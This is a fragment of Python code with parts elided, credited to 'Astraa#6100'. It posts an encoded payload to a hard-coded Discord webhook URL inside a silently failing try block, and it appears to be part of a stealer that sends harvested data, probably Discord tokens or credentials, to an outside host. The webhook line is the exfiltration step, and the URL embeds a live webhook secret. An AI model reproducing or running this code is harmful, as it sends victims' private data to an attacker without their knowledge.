...
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        ...
                        try:
                            ...
                            req = Request('https://discord.com/api/webhooks/1094252552876458085/_E6RzrSOhnCPmnvhhX_SC-cV_W5sqN4iIcwOx34tq5UXKCMSPMH9czqRcdWNaKiXr_JZ', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
